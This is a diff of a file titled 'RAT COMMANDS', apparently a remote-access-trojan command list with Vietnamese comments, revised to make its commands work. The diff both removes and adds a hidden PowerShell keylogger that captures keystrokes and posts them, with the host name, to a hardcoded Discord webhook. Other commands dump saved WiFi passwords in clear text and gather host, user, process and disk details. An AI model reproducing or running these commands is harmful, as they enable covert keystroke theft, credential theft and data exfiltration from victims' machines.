@@ -1,16 +1,16 @@
 # ===================== RAT COMMANDS =====================
-# Keylogger HOẠT ĐỘNG (System.Windows.Forms.Keyboard Hook)
-powershell -nop -w hidden -exec bypass -c "$h='https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';Add-Type -TypeDefinition 'using System;using System.Windows.Forms;public class K{public static void Main(){Application.Run();}}' -ReferencedAssemblies System.Windows.Forms;while(1){$o='';[System.Windows.Forms.Keys].GetEnumValues()|?{$_-ge8-and$_-le255}|%{if([System.Windows.Forms.Control]::ModifierKeys-band$_){$o+=[char]$_}};if($o){'['+(Get-Date -f'HH:mm:ss')+']'+$o|Add-Content '$env:TEMP\k.log';}if(Test-Path'$env:TEMP\k.log'){$c=gc'$env:TEMP\k.log'-Tail 20;$b=@{content='['+$env:COMPUTERNAME+']'+$c}|ConvertTo-Json;try{irm $h -Method Post-Body $b -ContentType'application/json'}catch{};ri'$env:TEMP\k.log'-Force};sleep 5}"
+# Keylogger HOẠT ĐỘNG (GetAsyncKeyState method)
+powershell -nop -w hidden -exec bypass -c "$log='$env:TEMP\keys.log';$h='https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int vKey);}';while(1){$o='';for($i=8;$i-le255;$i++){if([K]::GetAsyncKeyState($i)-band0x8000){$o+=[char]$i;}};if($o){'['+(Get-Date -f'HH:mm:ss')+'] '+$o|Add-Content $log;};if(Test-Path $log){$c=Get-Content $log -Tail 30;$b=@{content='['+$env:COMPUTERNAME+'] Keys: '+$c}|ConvertTo-Json;try{Invoke-RestMethod -Uri $h -Method Post -Body $b -ContentType 'application/json'}catch{};Remove-Item $log -Force};sleep 5}"
 
-# Keylogger đơn giản HOẠT ĐỘNG (Start-Process để chạy background)
-powershell -c "Start-Process powershell -ArgumentList '-nop -w hidden -exec bypass -c `"while(1){$o=\"\";for($i=8;$i-le255;$i++){Add-Type @\"using System;using System.Runtime.InteropServices;public class K{[DllImport(\\\"user32.dll\\\")]public static extern short GetAsyncKeyState(int vKey);}\"@;if([K]::GetAsyncKeyState($i)-band0x8000){$o+=[char]$i;}};if($o){\"[$(Get-Date -f HH:mm:ss)] $o\"|Add-Content \"$env:TEMP\keys.log\";};sleep -m 100}`"' -WindowStyle Hidden"
+# WiFi passwords (FIXED spacing)
+powershell -c "netsh wlan show profile name=* key=clear | Out-File '$env:TEMP\wifi.txt'; Get-Content '$env:TEMP\wifi.txt' | Select-String 'Key Content'"
 
-# Gửi logs định kỳ (chạy riêng)
-powershell -nop -w hidden -c "$h='https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';while(1){if(Test-Path'$env:TEMP\keys.log'){$c=gc'$env:TEMP\keys.log'-Tail 30;$b=@{content='🔑['+$env:COMPUTERNAME+']: '+$c}|ConvertTo-Json;try{irm $h -Method Post-Body $b -ContentType'application/json'}catch{};ri'$env:TEMP\keys.log'-Force};sleep 10}"
+# System info (FIXED spacing)
+powershell -c "echo 'HOST: ' $env:COMPUTERNAME; echo 'USER: ' $env:USERNAME"
 
-# WiFi passwords
-powershell -c "netsh wlan show profile name=* key=clear|Out-File'$env:TEMP\wifi.txt';gc'$env:TEMP\wifi.txt'|Select-String'Key Content'"
+# Process list
+powershell -c "Get-Process | Where-Object {$_.ProcessName -match 'task|svch|rund|reg|wmi'} | Select-Object Name,Id,Path | Format-Table -AutoSize"
 
-# System info
-powershell -c "echo'HOST:'$env:COMPUTERNAME;echo'USER:'$env:USERNAME"
+# Disk info
+powershell -c "Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object DeviceID,@{Name='SizeGB';Expression={[math]::Round($_.Size/1GB,2)}},@{Name='FreeGB';Expression={[math]::Round($_.FreeSpace/1GB,2)}} | Format-Table"
 # =======================================================
